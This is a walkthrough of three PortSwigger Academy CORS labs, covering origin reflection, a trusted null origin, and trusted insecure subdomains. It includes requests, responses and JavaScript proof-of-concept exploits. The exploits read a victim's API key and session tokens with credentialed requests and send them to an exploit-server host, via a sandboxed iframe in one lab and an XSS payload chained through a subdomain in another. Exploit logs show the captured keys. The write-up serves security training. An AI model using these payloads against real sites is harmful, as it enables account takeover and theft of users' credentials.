# CORS - Cross-Origin Resource Sharing (Labs: Portswigger Academy)

### Theory

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.

**Same-origin policy** The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.

| URL accessed                              | Access permitted?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Yes: same scheme, domain, and port |
| `http://normal-website.com/example2/`     | Yes: same scheme, domain, and port |
| `https://normal-website.com/example/`     | No: different scheme and port      |
| `http://en.normal-website.com/example/`   | No: different domain               |
| `http://www.normal-website.com/example/`  | No: different domain               |
| `http://normal-website.com:8080/example/` | No: different port\*               |

### Labs from PortSwigger Academy

#### Lab 1: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

request containing apikey:

```
GET /accountDetails HTTP/2
Host: 0ac2003b030ed9ea80d803c6005600e8.web-security-academy.net
Cookie: session=AYk4ZEVBL5wl0U2gf4Gi8KiGvnboFql3

```

response:

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "OeRqxlSRNKvCMV57w3fQmaZwnGjTcpEl",
  "sessions": [
    "AYk4ZEVBL5wl0U2gf4Gi8KiGvnboFql3"
  ]
}
```

adding `Origin: https://example.com` header in request

```
GET /accountDetails HTTP/2
Host: 0ac2003b030ed9ea80d803c6005600e8.web-security-academy.net
Cookie: session=AYk4ZEVBL5wl0U2gf4Gi8KiGvnboFql3
Origin: https://example.com

```

response:

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "OeRqxlSRNKvCMV57w3fQmaZwnGjTcpEl",
  "sessions": [
    "AYk4ZEVBL5wl0U2gf4Gi8KiGvnboFql3"
  ]
}
```

`Access-Control-Allow-Origin: https://example.com` `Access-Control-Allow-Credentials: true`

origin is reflected.

POC to extract the sensitive info

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ac2003b030ed9ea80d803c6005600e8.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

code explaination:

* request is made to `website/accountDetails`
* `withCredentials = true` tells the browser to include cookies with the request, this is possible due to `Access-Control-Allow-Credentials: true`
* `location='/log?key='+this.responseText` --> response is sent to our exploit server url.

our exploit server's should have log as

```
10.0.3.217      2025-10-28 12:19:28 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22mpT2XFAcjLSFFsYlBjGXRuD1qzq65Wsp%22,%20%20%22sessions%22:%20[%20%20%20%20%223UflW5VDKm9IGDh7cfRJWp1irqcvi7q9%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

URL decode using [CyberChef](https://gchq.github.io/CyberChef/) and we get the apikey

#### Lab 2: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

request containing apikey:

```
GET /accountDetails HTTP/2
Host: 0af30082038ec6d18136d490007c00f4.web-security-academy.net
Cookie: session=YpMXg5ZcU9MXLhMhryc1fLliLrDAFrJY
Content-Length: 378
```

adding `Origin: null` header on request

```
GET /accountDetails HTTP/2
Host: 0af30082038ec6d18136d490007c00f4.web-security-academy.net
Cookie: session=YpMXg5ZcU9MXLhMhryc1fLliLrDAFrJY
Origin: null
```

response:

```
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "nw57pJVML36MwJULdPsjgZmaxuBr4gDg",
  "sessions": [
    "YpMXg5ZcU9MXLhMhryc1fLliLrDAFrJY"
  ]
}
```

`Access-Control-Allow-Origin: null` `Access-Control-Allow-Credentials: true`

we need to change previous poc so that it looks like the request is coming from null origin. This can be achieved by adding sandbox iframe.

```js
<iframe syle="display: none;" sandbox="allow-scripts" srcdoc="
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0af30082038ec6d18136d490007c00f4.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0aa9002803e4c68e81cbd30701b70058.exploit-server.net/log?key='+this.responseText;
    };
</script>"></iframe>
```

we should get log as:

```
10.0.3.198      2025-10-28 12:48:31 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22kz9U7Bn1mfaEpBo13BFvpaojesBe4E70%22,%20%20%22sessions%22:%20[%20%20%20%20%22EKcKHNH3PKDAgwc80j5Iv4ho6zyEpDrh%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

url decode and we get the apikey of victim.

#### Lab 3: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

request for apikey

```
GET /accountDetails HTTP/2
Host: 0adc00b9035c201680e3037900f80074.web-security-academy.net
Cookie: session=WPmdC0sMbFpyI42cahPPMnMIyCIIZVGX
```

following headers does not work `Origin: null` `Origin: example.com` `Origin: 0adc00b9035c201680e3037900f80074.web-security-academy.net`

but following headers work `Origin: https://0adc00b9035c201680e3037900f80074.web-security-academy.net` `Origin: https://test.com.0adc00b9035c201680e3037900f80074.web-security-academy.net` `Origin: http://test.com.0adc00b9035c201680e3037900f80074.web-security-academy.net`

Application trusts all its subdomains.\
This is serious, if anyone of the subdomain is vulnerable then we can use that to make a malicious CORS request.

Searching for vulnerability. productId parameter is vulnerable to xss

```
https://stock.0adc00b9035c201680e3037900f80074.web-security-academy.net/?productId=1&storeId=1
```

xss

```
https://stock.0adc00b9035c201680e3037900f80074.web-security-academy.net/?productId=<script>+alert("XSS")%3b</script>&storeId=1
```

POC

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0adc00b9035c201680e3037900f80074.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0a6100fd039620f1805a02ab01da00a7.exploit-server.net/log?key='+this.responseText;
    };
</script>
```

Making POC integrated with XSS.

```js

<script>
	document.location="http://stock.0adc00b9035c201680e3037900f80074.web-security-academy.net/?productId=<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0adc00b9035c201680e3037900f80074.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0a6100fd039620f1805a02ab01da00a7.exploit-server.net/log?key='+this.responseText;
    };
    </script>&storeId=1"
</script>


```

Final POC:

```js
<script>document.location="http://stock.0adc00b9035c201680e3037900f80074.web-security-academy.net/?productId=<script>var req=new XMLHttpRequest();req.onload=reqListener;req.open('get','https://0adc00b9035c201680e3037900f80074.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function reqListener(){location='https://exploit-0a6100fd039620f1805a02ab01da00a7.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"</script>
```

### Bug Bounty Reports

* [Cross Origin Resource Sharing Misconfiguration](https://hackerone.com/reports/958459)
* [Bypassing CORS Misconfiguration Leads to Sensitive Exposure](https://hackerone.com/reports/1092125)
